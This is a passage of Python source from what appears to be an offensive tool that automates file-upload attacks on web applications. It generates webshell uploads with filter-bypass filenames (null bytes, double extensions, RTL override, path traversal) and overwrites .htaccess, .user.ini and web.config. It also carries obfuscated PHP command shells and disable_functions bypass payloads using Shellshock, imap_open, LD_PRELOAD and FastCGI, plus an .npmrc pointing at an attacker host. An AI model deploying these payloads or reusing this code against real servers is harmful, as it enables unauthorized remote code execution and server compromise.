    if getattr(opts, "no_method_filter", False):
        return list(pending), {}
    run, skipped = [], {}
    for m in pending:
        missing = MODULE_REQUIREMENTS.get(m, set()) - caps
        if missing:
            skipped[m] = missing
        else:
            run.append(m)
    return run, skipped

# ─────────────────────────────────────────────────────────────────────────────
# SECTION 9 — HELPER: run_variants
# ─────────────────────────────────────────────────────────────────────────────

def run_variants(ctx: UploadContext, variants: list, mod_name: str) -> bool:
    """Send a list of (filename, content, mime) tuples.
    Returns True if any upload was accepted + optionally exec confirmed.
    Respects stop_flag for stop-on-first-hit mode.
    """
    found_any = False
    for filename, content, mime in variants:
        if ctx._should_abort():
            return found_any
        resp = ctx.send(filename, content, mime)
        label = f"{filename[:40]} | {mime[:30]}"
        ctx.output.tick(label)
        ctx.dump_response(resp)
        if ctx.is_success(resp):
            exec_url = ""
            if ctx.opts.upload_dir:
                exec_url = (ctx.opts.upload_dir.rstrip("/") + "/" + filename)
            exec_ok = ctx.verify_exec(filename, upload_resp=resp)
            ctx.output.record(mod_name, filename, mime,
                              any(content.startswith(m) for m in MAGIC.values()),
                              exec_url,
                               "Verified RCE" if exec_ok else "Uploaded",
                              response=resp)
            found_any = True
            if not ctx.opts.brute_force:
                ctx.stop_flag.set()
                return True
    return found_any

# ─────────────────────────────────────────────────────────────────────────────
# Bypass / Evasion
# ─────────────────────────────────────────────────────────────────────────────

@module("mime_spoofing")
def mod_mime_spoofing(ctx: UploadContext):
    """MIME type spoofing: PHP ext with image MIME ± magic bytes (4 combos per ext)."""
    info("mime_spoofing — PHP extension with image MIME ± magic bytes")
    exts    = EXTENSIONS.get(ctx.opts.extension, [ctx.opts.extension])
    allowed = ctx.opts.allowed or "jpg"
    shell   = SHELLS.get(ctx.opts.extension, SHELLS["php"])
    magic   = MAGIC.get(allowed, b"")

    variants = []
    for ext in exts:
        name = ctx.rnd_name() + "." + ext
        for mbytes in [b"", magic]:
            for mime in [get_mime(ext), get_mime(allowed), "application/octet-stream"]:
                variants.append((name, mbytes + shell, mime))
    run_variants(ctx, variants, "mime_spoofing")


@module("double_extension")
def mod_double_extension(ctx: UploadContext):
    """Double extension both orders: .mal.ben and .ben.mal with case + MIME combos."""
    info("double_extension — .mal.ben / .ben.mal with case variants")
    ext     = ctx.opts.extension
    allowed = ctx.opts.allowed or "jpg"
    exts    = EXTENSIONS.get(ext, [ext])
    shell   = SHELLS.get(ext, SHELLS["php"])
    magic   = MAGIC.get(allowed, b"")

    variants = []
    for mal in exts:
        for cased_mal in case_variants(mal):
            # .ben.mal (forward double — allowed comes first, malicious last)
            name_fwd = ctx.rnd_name() + f".{allowed}.{cased_mal}"
            # .mal.ben (reverse double — malicious first, allowed last)
            name_rev = ctx.rnd_name() + f".{cased_mal}.{allowed}"
            # .mal.mal (same-ext double as observed in some parsers)
            name_dbl = ctx.rnd_name() + f".{cased_mal}.{cased_mal}"

            for name in [name_fwd, name_rev, name_dbl]:
                for mbytes in [b"", magic]:
                    for mime in [get_mime(mal), get_mime(allowed)]:
                        variants.append((name, mbytes + shell, mime))
    run_variants(ctx, variants, "double_extension")


@module("extension_shuffle")
def mod_extension_shuffle(ctx: UploadContext):
    """All malicious extensions + systematic case variants + 4 MIME×magic combos."""
    info("extension_shuffle — full extension list + all case variants")
    ext_to_test = ctx.opts.extension
    allowed     = ctx.opts.allowed or "jpg"
    exts        = EXTENSIONS.get(ext_to_test, [ext_to_test])
    shell       = SHELLS.get(ext_to_test, SHELLS["php"])
    magic_bytes = MAGIC.get(allowed, b"")

    variants = []
    for ext in exts:
        for cased in case_variants(ext):
            name = ctx.rnd_name() + "." + cased
            for (mbytes, use_m) in [(b"", False), (magic_bytes, True)]:
                for mime in [get_mime(ext), get_mime(allowed)]:
                    body = mbytes + shell
                    variants.append((name, body, mime))
    run_variants(ctx, variants, "extension_shuffle")


@module("null_byte_cutoff")
def mod_null_byte_cutoff(ctx: UploadContext):
    """Full 10-variant null byte set in BOTH positions (.php§NULL§.jpg AND .jpg§NULL§.php)."""
    info("null_byte_cutoff — 10 null bytes × 2 positions × MIME combos")
    exts    = EXTENSIONS.get(ctx.opts.extension, [ctx.opts.extension])[:4]  # limit iterations
    allowed = ctx.opts.allowed or "jpg"
    shell   = SHELLS.get(ctx.opts.extension, SHELLS["php"])
    magic   = MAGIC.get(allowed, b"")

    variants = []
    for ext in exts:
        for nb in NULL_BYTES:
            base = ctx.rnd_name()
            # Position 1: .php{NULL}.jpg
            name_a = base + f".{ext}{nb}.{allowed}"
            # Position 2: .jpg{NULL}.php
            name_b = base + f".{allowed}{nb}.{ext}"
            for name in [name_a, name_b]:
                for mbytes in [b"", magic]:
                    for mime in [get_mime(ext), get_mime(allowed)]:
                        variants.append((name, mbytes + shell, mime))
    run_variants(ctx, variants, "null_byte_cutoff")


@module("stripping_extension")
def mod_stripping_extension(ctx: UploadContext):
    """Stripping bypass: .p.phphp / .pphphp — server strips 'php' leaving valid ext."""
    info("stripping_extension — .p.phphp / .pphphp patterns")
    exts  = EXTENSIONS.get(ctx.opts.extension, [ctx.opts.extension])
    shell = SHELLS.get(ctx.opts.extension, SHELLS["php"])

    variants = []
    for ext in exts:
        if len(ext) >= 2:
            # .p.phphp → server strips 'php' from middle → .p.hp? Actually the pattern is:
            # inject: shell.p.phphp → server strips 'php' → shell.p.hp → still executes
            # pattern from Upload_Bypass: f".{ext[0]}.{ext}{ext[1:]}" e.g. ".p.phphp"
            v1 = ctx.rnd_name() + f".{ext[0]}.{ext}{ext[1:]}"
            # .pphphp → server strips 'php' → .php
            v2 = ctx.rnd_name() + f".{ext[0]}{ext}{ext[1:]}"
            for name in [v1, v2]:
                for mime in [get_mime(ext), get_mime(ctx.opts.allowed or "jpg")]:
                    variants.append((name, shell, mime))
    run_variants(ctx, variants, "stripping_extension")


@module("discrepancy")
def mod_discrepancy(ctx: UploadContext):
    """Dot URL-encoding: replaces '.' with %2e and %252e (double URL-encode)."""
    info("discrepancy — %2e / %252e dot encoding")
    exts  = EXTENSIONS.get(ctx.opts.extension, [ctx.opts.extension])
    shell = SHELLS.get(ctx.opts.extension, SHELLS["php"])

    variants = []
    for ext in exts:
        base = ctx.rnd_name()
        for enc in ["%2e", "%252e"]:
            name = base + enc + ext
            for mime in [get_mime(ext), get_mime(ctx.opts.allowed or "jpg")]:
                variants.append((name, shell, mime))
    run_variants(ctx, variants, "discrepancy")


@module("name_overflow")
def mod_name_overflow(ctx: UploadContext):
    """Name overflow: 255-byte AND 236-byte (IIS-specific) filename padding."""
    info("name_overflow — 255 + 236 byte filename padding")
    exts    = EXTENSIONS.get(ctx.opts.extension, [ctx.opts.extension])
    allowed = ctx.opts.allowed or "jpg"
    shell   = SHELLS.get(ctx.opts.extension, SHELLS["php"])
    magic   = MAGIC.get(allowed, b"")

    variants = []
    for ext in exts:
        for overflow_len in [255, 236]:
            ext_part = f".{ext}.{allowed}"
            pad_len  = overflow_len - len(ext_part)
            if pad_len < 1:
                continue
            name = ("A" * pad_len) + ext_part
            for mbytes in [b"", magic]:
                for mime in [get_mime(ext), get_mime(allowed)]:
                    variants.append((name, mbytes + shell, mime))
    run_variants(ctx, variants, "name_overflow")


@module("special_char_bypass")
def mod_special_char_bypass(ctx: UploadContext):
    """Special character bypass techniques from wordlist.txt, file_name_bypasser.py,
    extension.yaml, and upfile.py.

    Covers all techniques NOT in other modules:
      - Trailing dot            : shell.php.
      - No extension            : shell  (bare basename)
      - Semicolon separator     : shell.php;.jpg
      - RTL override U+202E     : shell\u202Egpj.php  (displays as shellphp.jpg)
      - URL-encoded RTL %E2%80%AE : shell%E2%80%AEgpj.php
      - Windows ADS colon       : shell.php:.jpg
      - Backslash separator     : shell.php.\\.jpg
      - Double dot              : shell.php..jpg
      - Ellipsis char U+2026    : shell.php\u2026jpg
      - Newline in extension    : shell.php%0a.jpg
      - CRLF in extension       : shell.php%0d%0a.jpg
      - Trailing slash          : shell.php/
      - Slash dot               : shell.php/.
      - Trailing space (encoded): shell.php%20
      - Double URL-encoded dot  : shell%252ephp
      - Dot + allowed bypass    : shell.php .jpg  (space before allowed)
    """
    info("special_char_bypass — trailing dot / RTL override / semicolon / ADS colon / newline")
    ext     = ctx.opts.extension
    allowed = ctx.opts.allowed or "jpg"
    exts    = EXTENSIONS.get(ext, [ext])
    shell   = SHELLS.get(ext, SHELLS["php"])
    magic   = MAGIC.get(allowed, b"")

    variants = []
    for mal in exts[:6]:           # limit to first 6 to avoid explosion
        base = ctx.rnd_name()
        rtl  = "\u202E"            # U+202E RIGHT-TO-LEFT OVERRIDE
        ell  = "\u2026"            # U+2026 HORIZONTAL ELLIPSIS

        filenames = [
            # Trailing dot (NTFS strips it on write)
            f"{base}.{mal}.",
            # No extension — bare basename
            f"{base}",
            # Semicolon separator (Apache treats as extension boundary)
            f"{base}.{mal};.{allowed}",
            # RTL override — visual trick; server sees .php, user sees .jpg
            f"{base}{rtl}gpj.{mal}",
            # URL-encoded RTL override (%E2%80%AE)
            f"{base}%E2%80%AEgpj.{mal}",
            # Windows Alternate Data Streams colon
            f"{base}.{mal}:.{allowed}",
            # Backslash separator
            f"{base}.{mal}.\\.{allowed}",
            # Double dot
            f"{base}.{mal}..{allowed}",
            # Ellipsis character
            f"{base}.{mal}{ell}{allowed}",
            # Newline in extension (some WAFs/parsers stop at \n)
            f"{base}.{mal}%0a.{allowed}",
            # CRLF in extension
            f"{base}.{mal}%0d%0a.{allowed}",
            # Trailing slash
            f"{base}.{mal}/",
            # Slash dot
            f"{base}.{mal}/.",
            # Trailing space URL-encoded
            f"{base}.{mal}%20",
            # Double URL-encoded dot (%25 = %, so %252e = %2e = .)
            f"{base}%252e{mal}",
            # Dot + space before allowed (some parsers split on space)
            f"{base}.{mal} .{allowed}",
            # PHP-specific: .php/. path trick
            f"{base}.{mal}/.",
        ]

        for fname in filenames:
            for mbytes in [b"", magic]:
                for mime in [get_mime(mal), get_mime(allowed)]:
                    variants.append((fname, mbytes + shell, mime))

    run_variants(ctx, variants, "special_char_bypass")


@module("data_uri_upload")
def mod_data_uri_upload(ctx: UploadContext):
    """Data URI upload — send 'data:image/jpeg;base64,...' as file content.
    Some upload handlers fetch/decode data URIs server-side, treating them as URLs.
    Also tests as filename injection (data URI in the filename field itself).
    From AutoShell technique 9.
    """
    info("data_uri_upload — data:image/jpeg;base64 upload + filename injection")
    exts    = EXTENSIONS.get(ctx.opts.extension, [ctx.opts.extension])
    allowed = ctx.opts.allowed or "jpg"
    shell   = SHELLS.get(ctx.opts.extension, SHELLS["php"])

    # Build data URI with shell content
    b64_shell = base64.b64encode(shell).decode()
    data_uri_php  = f"data:image/jpeg;base64,{b64_shell}".encode()
    data_uri_jpg  = f"data:image/jpeg;base64,{base64.b64encode(MAGIC['jpg']).decode()}".encode()
    data_uri_png  = f"data:image/png;base64,{base64.b64encode(MAGIC['png']).decode()}".encode()

    # Filename containing data URI (injection in filename param)
    probe = "UpMapDU" + "".join(random.choices(string.digits, k=6))
    fname_injection = f"data:image/jpeg;base64,{b64_shell};filename={probe}.php"

    variants = []
    # Data URI as file content
    for payload in [data_uri_php, data_uri_jpg, data_uri_png]:
        for ext in exts[:3] + [allowed]:
            for mime in [get_mime(allowed), "image/jpeg", ""]:
                variants.append((ctx.rnd_name() + "." + ext, payload, mime or "image/jpeg"))
    # Data URI in filename field
    for ext in exts[:3]:
        variants.append((fname_injection, shell, get_mime(allowed)))
    run_variants(ctx, variants, "data_uri_upload")


@module("php_obfuscation")
def mod_php_obfuscation(ctx: UploadContext):
    """PHP shell obfuscation wrappers — bypass WAFs that pattern-match system()/passthru().
    Wraps the shell payload in: base64+eval, gzinflate+eval, str_rot13+eval,
    hex+eval, assert()+chr() chain, and concatenation tricks.
    From AutoShell techniques 6/7/8 — targets execution-layer filters, not upload filters.
    """
    info("php_obfuscation — base64/gzip/rot13/hex/assert eval wrappers (AutoShell)")
    exts    = EXTENSIONS.get(ctx.opts.extension, [ctx.opts.extension])
    allowed = ctx.opts.allowed or "jpg"
    magic   = MAGIC.get(allowed, b"")

    # Core shell to obfuscate — use system() via variable to avoid literal match
    raw_shell = b"system($_GET['cmd']);"

    # 1. base64 + eval (AutoShell technique 6)
    b64 = base64.b64encode(raw_shell).decode()
    php_b64 = f"<?php eval(base64_decode('{b64}')); ?>".encode()

    # 2. gzinflate + base64 + eval (AutoShell technique 7)
    gz_compressed = base64.b64encode(zlib.compress(raw_shell)[2:-4]).decode()  # strip zlib header/checksum
    php_gz = f"<?php eval(gzinflate(base64_decode('{gz_compressed}'))); ?>".encode()

    # 3. str_rot13 + eval
    rot13_shell = raw_shell.decode().translate(
        str.maketrans(
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
            "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"
        )
    )
    php_rot13 = f"<?php eval(str_rot13('{rot13_shell}')); ?>".encode()

    # 4. Hex-encoded eval
    hex_shell = raw_shell.hex()
    php_hex = f"<?php eval(hex2bin('{hex_shell}')); ?>".encode()

    # 5. assert() + chr() chain (avoids 'eval' keyword)
    chr_chain = "+".join(f"chr({b})" for b in raw_shell)
    php_assert = f"<?php assert({chr_chain}); ?>".encode()

    # 6. Concatenation split — breaks up 'system' string literal
    php_concat = b"<?php $f='sys'.'tem';$g='_GE'.'T';$h='cm'.'d';$f($$g[$h]); ?>"

    # 7. Variable-variable indirection
    php_varvar = b"<?php $_=('s'.'ystem');$_(($_SERVER['QUERY_STRING'])); ?>"

    # 8. Preg_replace /e modifier (PHP <5.5 — but some old servers)
    php_preg = b"<?php preg_replace('/.*/e',base64_decode('c3lzdGVtKCRfR0VUW2NtZF0pOw=='),''); ?>"

    obf_shells = [php_b64, php_gz, php_rot13, php_hex, php_assert, php_concat, php_varvar, php_preg]

    variants = []
    for shell in obf_shells:
        for ext in exts:
            for mbytes in [b"", magic]:
                for mime in [get_mime(ext), get_mime(allowed)]:
                    variants.append((ctx.rnd_name() + "." + ext, mbytes + shell, mime))
    run_variants(ctx, variants, "php_obfuscation")


# ─────────────────────────────────────────────────────────────────────────────
# Filename / Path Injection
# ─────────────────────────────────────────────────────────────────────────────

@module("path_traversal_filename")
def mod_path_traversal_filename(ctx: UploadContext):
    """Path traversal injected directly into the filename parameter (../ and ..%2f)."""
    info("path_traversal_filename — ../ and ..%2f in filename field")
    shell   = SHELLS.get(ctx.opts.extension, SHELLS["php"])
    rnd     = ctx.rnd_name()
    allowed = ctx.opts.allowed or "jpg"

    payloads = [
        f"../../../{rnd}.php",
        f"..%2f..%2f..%2f{rnd}.php",
        f"....//....//....// {rnd}.php",
        f"..\\..\\..\\{rnd}.php",
        f"%2e%2e%2f%2e%2e%2f{rnd}.php",
    ]
    variants = []
    for p in payloads:
        for mime in [get_mime("php"), get_mime(allowed)]:
            variants.append((p, shell, mime))
    run_variants(ctx, variants, "path_traversal_filename")


# ─────────────────────────────────────────────────────────────────────────────
# Config / Handler Abuse
# ─────────────────────────────────────────────────────────────────────────────

@module("htaccess_overwrite")
def mod_htaccess_overwrite(ctx: UploadContext):
    """Upload .htaccess to register arbitrary extension as PHP handler."""
    info("htaccess_overwrite — .htaccess AddType / SetHandler")
    allowed   = ctx.opts.allowed or "jpg"
    arb_ext   = "upmap"
    shell     = SHELLS.get(ctx.opts.extension, SHELLS["php"])
    htaccess_variants = [
        f"AddType application/x-httpd-php .{arb_ext}",
        f"AddHandler php5-script .{arb_ext}",
        f"AddHandler php7-script .{arb_ext}",
        f'<FilesMatch "\\.{arb_ext}$">\n  SetHandler application/x-httpd-php\n</FilesMatch>',
        f"AddType application/x-httpd-php .{arb_ext} .php .php5 .phtml",
        "Options +Indexes +FollowSymLinks +Includes\nAddHandler server-parsed .shtml\n"
        f"AddType application/x-httpd-php .{arb_ext}",
    ]

    # First test if arbitrary extension is accepted
    test_name = ctx.rnd_name() + f".{arb_ext}"
    r = ctx.send(test_name, shell, get_mime(allowed))
    if not ctx.is_success(r):
        warn("htaccess: arbitrary extension not accepted — blacklist likely")
        return

    variants = []
    for ht_content in htaccess_variants:
        ht_bytes = ht_content.encode()
        variants.append((".htaccess", ht_bytes, "text/plain"))
        variants.append((".htaccess", ht_bytes, get_mime(allowed)))

    run_variants(ctx, variants, "htaccess_overwrite")

    # .user.ini — PHP CGI/LiteSpeed per-directory config (parallel to .htaccess)
    # Sets auto_prepend_file so any image access also executes the uploaded shell.
    user_ini_variants = [
        f"auto_prepend_file={ctx.rnd_name()}.{arb_ext}",
        f"auto_prepend_file=uploads/{ctx.rnd_name()}.{arb_ext}",
        f"auto_prepend_file=/tmp/{ctx.rnd_name()}.{arb_ext}",
        "cgi.force_redirect=0\ncgi.redirect_status_env=foo\nauto_prepend_file=shell.php",
    ]
    info("htaccess_overwrite — also testing .user.ini for LiteSpeed/PHP-CGI")
    for ini_content in user_ini_variants:
        ini_bytes = ini_content.encode()
        variants_ini = [
            (".user.ini", ini_bytes, "text/plain"),
            (".user.ini", ini_bytes, get_mime(allowed)),
            (".user.ini", ini_bytes, "application/octet-stream"),
        ]
        run_variants(ctx, variants_ini, "htaccess_overwrite")


@module("web_config_overwrite")
def mod_web_config_overwrite(ctx: UploadContext):
    """Upload web.config for ASP.NET handler registration / ASP code exec."""
    info("web_config_overwrite — IIS web.config AddHandler")
    allowed = ctx.opts.allowed or "jpg"
    arb_ext = "upmap"
    web_config = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<configuration>\n  <system.webServer>\n    <handlers accessPolicy="Read, Script, Write">\n'
        f'      <add name="upmap" path="*.{arb_ext}" verb="*" modules="IsapiModule" '
        'scriptProcessor="%windir%\\system32\\inetsrv\\asp.dll" '
        'resourceType="Unspecified" requireAccess="Write" preCondition="bitness64"/>\n'
        "    </handlers>\n    <security>\n      <requestFiltering>\n"
        f'        <fileExtensions><remove fileExtension=".{arb_ext}"/></fileExtensions>\n'
        "        <hiddenSegments><remove segment=\"web.config\"/></hiddenSegments>\n"
        "      </requestFiltering>\n    </security>\n  </system.webServer>\n</configuration>\n"
    )
    variants = [
        ("web.config", web_config.encode(), "text/plain"),
        ("web.config", web_config.encode(), get_mime(allowed)),
        ("Web.config", web_config.encode(), "text/plain"),
    ]
    run_variants(ctx, variants, "web_config_overwrite")


@module("config_file_upload")
def mod_config_file_upload(ctx: UploadContext):
    """Configuration file uploads: .env, .htpasswd, web.xml, robots.txt overwrite.

    Servers that allow uploading arbitrary filenames may accept sensitive
    config files. If the file lands in the web root or a processed directory:
      - .env       → exposes secrets, changes Laravel/Symfony/Node config
      - .htpasswd  → overwrites HTTP basic auth credentials
      - web.xml    → ASP.NET / Java EE servlet config
      - robots.txt → recon / disclosure of hidden paths
      - crossdomain.xml → Flash/PDF CSRF policy widening
      - sitemap.xml → path disclosure
      - .npmrc     → NPM registry override (supply chain)

    This module tests whether the server accepts these filenames and
    records any that succeed (useful for identifying path-unrestricted uploads).
    """
    info("config_file_upload — .env / .htpasswd / web.xml / crossdomain.xml")
    probe = "UpMapCfg" + "".join(random.choices(string.digits, k=6))

    config_files = [
        # .env — Laravel, Symfony, Django, Node.js
        (".env",
         f"APP_ENV=production\nAPP_DEBUG=true\nDB_PASSWORD={probe}\n"
         f"SECRET_KEY={probe}\nAWS_SECRET_ACCESS_KEY={probe}\n".encode(),
         "text/plain"),
        # .htpasswd — Apache basic auth
        (".htpasswd",
         f"admin:{probe}\nroot:{probe}\n".encode(),
         "text/plain"),
        # web.xml — Java EE / Tomcat servlet mapping
        ("web.xml",
         f'<?xml version="1.0"?><web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee">'
         f'<servlet><servlet-name>{probe}</servlet-name>'
         f'<servlet-class>org.apache.jsp.{probe}</servlet-class></servlet></web-app>'.encode(),
         "text/xml"),
        # crossdomain.xml — Flash/PDF cross-domain policy widening
        ("crossdomain.xml",
         b'<?xml version="1.0"?><cross-domain-policy>'
         b'<allow-access-from domain="*"/></cross-domain-policy>',
         "text/xml"),
        # clientaccesspolicy.xml — Silverlight equivalent
        ("clientaccesspolicy.xml",
         b'<?xml version="1.0"?><access-policy><cross-domain-access>'
         b'<policy><allow-from http-request-headers="*">'
         b'<domain uri="*"/></allow-from>'
         b'<grant-to><resource path="/" include-subpaths="true"/>'
         b'</grant-to></policy></cross-domain-access></access-policy>',
         "text/xml"),
        # robots.txt — path disclosure
        (f"robots.txt",
         f"User-agent: *\nAllow: /\n# {probe}\n".encode(),
         "text/plain"),
        # .npmrc — NPM registry override (supply chain risk)
        (".npmrc",
         f"registry=http://attacker.example.com\n//attacker.example.com/:_authToken={probe}\n".encode(),
         "text/plain"),
        # composer.json — PHP dependency injection
        ("composer.json",
         f'{{"require":{{"vendor/{probe}":"*"}}}}\n'.encode(),
         "application/json"),
    ]

    variants = []
    for fname, content, mime in config_files:
        for m in [mime, "application/octet-stream", "image/jpeg"]:
            variants.append((fname, content, m))

    run_variants(ctx, variants, "config_file_upload")


# ─────────────────────────────────────────────────────────────────────────────
# RCE / Code Execution
# ─────────────────────────────────────────────────────────────────────────────

def _php_disable_func_payloads(param: str, so64: str, so32: str):
    """disable_functions / alternative-execution RCE bodies (l3m0n + classic CVEs).
    Each is a self-contained PHP file that runs ?<param>= via a non-system() vector
    and echoes the result. Returns [(label, php_bytes), …]."""
    snippets = {
        # pcntl_exec — fork + exec /bin/bash on a written script
        "df_pcntl_exec": r'''<?php
$c=$_GET["__P__"];$o=tempnam(sys_get_temp_dir(),"o");$s=tempnam(sys_get_temp_dir(),"s");
file_put_contents($s,"#!/bin/bash\n".$c." >".$o." 2>&1\n");@chmod($s,0755);
$pid=pcntl_fork();if($pid==0){pcntl_exec("/bin/bash",array($s));}
else{pcntl_waitpid($pid,$st);echo @file_get_contents($o);@unlink($o);@unlink($s);}
?>''',
        # imap_open -oProxyCommand injection (CVE-2018-19518)
        "df_imap_open": r'''<?php
$c=$_GET["__P__"];$o="/tmp/o_".getmypid();
$srv="x -oProxyCommand=echo\t".base64_encode($c." >".$o." 2>&1")."|base64\t-d|sh}";
@imap_open("{".$srv.":143/imap}INBOX","","");sleep(2);echo @file_get_contents($o);@unlink($o);
?>''',
        # LD_PRELOAD system.so via mail()/error_log()/mb_send_mail() + putenv
        "df_ld_preload": r'''<?php
$c=$_GET["__P__"];$o="/tmp/o_".getmypid();$so="/tmp/s_".getmypid().".so";
$h=(PHP_INT_SIZE===8)?"__SO64__":"__SO32__";
file_put_contents($so,hex2bin($h));
putenv("EVIL_CMDLINE=".$c." >".$o." 2>&1");putenv("LD_PRELOAD=".$so);
if(function_exists("error_log"))@error_log("",1,"a@a.com");
elseif(function_exists("mail"))@mail("a@a.com","","","");
elseif(function_exists("mb_send_mail"))@mb_send_mail("a@a.com","","");
@unlink($so);echo @file_get_contents($o);@unlink($o);
?>''',
        # Shellshock via mail() (CVE-2014-6271)
        "df_shellshock": r'''<?php
$c=$_GET["__P__"];$o=tempnam(sys_get_temp_dir(),"o");
putenv("PHP_LOL=() { x; }; ".$c." >".$o." 2>&1");
@mail("a@127.0.0.1","","","","-bv");
echo @file_get_contents($o);@unlink($o);
?>''',
        # Exim ${run{}} command injection via mail() 5th arg
        "df_exim": r'''<?php
$c=$_GET["__P__"];$o="/tmp/o_".getmypid();$s="/tmp/s_".getmypid().".sh";
file_put_contents($s,$c." >".$o." 2>&1");
$p="-be \${run{/bin/bash\${substr{10}{1}{\$tod_log}}".$s."}{ok}{error}}";
@mail("a@localhost","","","",$p);echo @file_get_contents($o);@unlink($o);@unlink($s);
?>''',
        # dl() PHP-extension load (needs the AntSword ext .so server-side)
        "df_dl": r'''<?php
$c=$_GET["__P__"];
if(function_exists("dl")){@dl("ant_x64.so");if(function_exists("antsystem"))echo antsystem($c);else echo "dl-loaded";}
?>''',
        # COM('WScript.Shell') — Windows
        "df_com": r'''<?php
$c=$_GET["__P__"];$o=getenv("TEMP")."\\o_".getmypid();
$w=new COM("WScript.Shell");$w->Run("cmd.exe /c ".$c." >".$o,0,true);sleep(1);echo @file_get_contents($o);@unlink($o);
?>''',
        # Apache mod_cgi — register a CGI handler via .htaccess + a shell script
        "df_mod_cgi": r'''<?php
$c=$_GET["__P__"];
@file_put_contents(".htaccess","Options +ExecCGI\nAddHandler cgi-script .dizzle\n");
@file_put_contents("upmap.dizzle","#!/bin/bash\necho \"Content-Type: text/html\"\necho \"\"\n".$c."\n");
@chmod("upmap.dizzle",0755);
echo "wrote upmap.dizzle (request it to exec)";
?>''',
        # FastCGI / PHP-FPM direct socket (auto_prepend php://input) — l3m0n
        "df_fastcgi": r'''<?php
$cmd=$_GET["__P__"];$file="/var/www/html/index.php";$host="127.0.0.1";$port=9000;
function p($x){return bin2hex(chr($x));}
function nv($l){if($l<128){return p($l);}return p(($l>>24)|0x80).p(($l>>16)&0xFF).p(($l>>8)&0xFF).p($l&0xFF);}
$php='<?php system(base64_decode("'.base64_encode($cmd).'"));exit();?>';
$cl=strlen($php);$pad=p(($cl>>8)&0xFF).p($cl&0xFF).p(0).p(0);$uv=nv(strlen($file));
$params='0e02434f4e54454e545f4c454e475448'.bin2hex($cl).'0c10434f4e54454e545f545950456170706c69636174696f6e2f746578740b0452454d4f54455f504f5254393938350b095345525645525f4e414d456c6f63616c686f7374110b474154455741595f494e54455246414345466173744347492f312e300f0e5345525645525f534f4654574152457068702f66636769636c69656e740b0952454d4f54455f414444523132372e302e302e310f'.$uv.'5343524950545f46494c454e414d45'.bin2hex($file).'0b'.$uv.'5343524950545f4e414d45'.bin2hex($file).'091f5048505f56414c55456175746f5f70726570656e645f66696c65203d207068703a2f2f696e7075740e04524551554553545f4d4554484f44504f53540b025345525645525f504f525438300f085345525645525f50524f544f434f4c485454502f312e310c0051554552595f535452494e470f165048505f41444d494e5f56414c5545616c6c6f775f75726c5f696e636c756465203d204f6e0d01444f43554d454e545f524f4f542f0b095345525645525f414444523132372e302e302e310b'.$uv.'524551554553545f555249'.bin2hex($file);
$pl=strlen(hex2bin($params));$ppad=p(($pl>>8)&0xFF).p($pl&0xFF).p(0).p(0);
$data='01017b0700080000000100000000000001047b07'.$ppad.$params.'01047b070000000001057b07'.$pad.bin2hex($php).'01057b0700000000';
$fp=@stream_socket_client("tcp://".$host.":".$port,$e,$s,5);if(!$fp){$fp=@fsockopen($host,$port,$e,$s,5);}
if($fp){fwrite($fp,hex2bin($data));$r="";while(!feof($fp)){$r.=fgets($fp,4096);}fclose($fp);echo $r;}
?>''',
        "df_imagick": r'''<?php
$c=$_GET["__P__"];$o=tempnam(sys_get_temp_dir(),"img");
$m=tempnam(sys_get_temp_dir(),"img");
$e="push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://127.0.0.1/x.jpg\"|".$c.">".$o." 2>&1\")'\npop graphic-context";
file_put_contents($m,$e);
$i=new Imagick();$i->readImage($m);$i->writeImage(tempnam(sys_get_temp_dir(),"img"));$i->clear();$i->destroy();
@unlink($m);echo @file_get_contents($o);@unlink($o);
?>''',
    }
    out = []
    for label, src in snippets.items():
        php = src.replace("__P__", param).replace("__SO64__", so64).replace("__SO32__", so32)
        out.append((label, php.encode()))
    return out


def _php_callback_shells(param: str):
    """PHP callback-function obfuscation family (LandGrey): built-ins that take a
    callback are used to dispatch system()/assert() indirectly, the callback name
    rebuilt by concatenation so no literal `system`/`assert` appears. Returns
    [php_bytes, …] for both targets across several dispatchers."""
    req = '$_REQUEST["' + param + '"]'
    out = []
    for fexpr in ('"sy"."st"."em"', '"as"."se"."rt"'):
        out += [
            ('<?php $f=' + fexpr + ';array_map($f,array(' + req + '));?>').encode(),
            ('<?php $f=' + fexpr + ';array_filter(array(' + req + '),$f);?>').encode(),
            ('<?php $f=' + fexpr + ';$a=array(' + req + ',1);usort($a,$f);?>').encode(),
            ('<?php $f=' + fexpr + ';call_user_func($f,' + req + ');?>').encode(),
            ('<?php $f=' + fexpr + ';array_udiff(array(' + req + '),array(1),$f);?>').encode(),
            ('<?php $f=' + fexpr + ';array_intersect_ukey(array(' + req + '=>1),array(1),$f);?>').encode(),
            ('<?php $f=' + fexpr + ';forward_static_call_array($f,array(' + req + '));?>').encode(),
            ('<?php $f=' + fexpr + ';register_shutdown_function($f,' + req + ');?>').encode(),
        ]
    return out


def _png_text_payload(payload: bytes) -> bytes:
    """A *valid* 1×1 PNG carrying `payload` in a real tEXt chunk.
    Passes getimagesize() / a structural PNG check. NOTE: a tEXt (or appended)
    payload does NOT survive a GD imagecreatefromgif()/imagepng() re-encode —
    use GD_SURVIVOR_GIF for that case."""
    def _chunk(typ: bytes, data: bytes) -> bytes:
        return (len(data).to_bytes(4, "big") + typ + data
                + (zlib.crc32(typ + data) & 0xffffffff).to_bytes(4, "big"))
    ihdr = b"\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00"   # 1×1, RGB
    return (b"\x89PNG\r\n\x1a\n"
            + _chunk(b"IHDR", ihdr)
            + _chunk(b"tEXt", b"Comment\x00" + payload)
            + _chunk(b"IDAT", zlib.compress(b"\x00\xff\x00\x00"))
            + _chunk(b"IEND", b""))


@module("php_rce")
def mod_php_rce(ctx: UploadContext):
    """PHP RCE: simple shell, obfuscated, GIF89a polyglot, valid PNG tEXt chunk,
    GD re-encode survivor GIF, disable_functions bypass (9 vectors),
    and callback-function obfuscation (LandGrey: 16 variants).
    """
    info("php_rce — PHP shell variants + GIF polyglot + PNG tEXt + GD survivor "
         "+ disable_functions bypass + callback obfuscation")
    allowed = ctx.opts.allowed or "jpg"
    magic_j = MAGIC.get("jpg",  b"")
    magic_p = MAGIC.get("png",  b"")
    magic_g = MAGIC.get("gif",  b"")
    param   = getattr(ctx.opts, "cmd_param", "cmd") or "cmd"

    idat_code = b"<?=$_GET[0]($_POST[1]);?>"
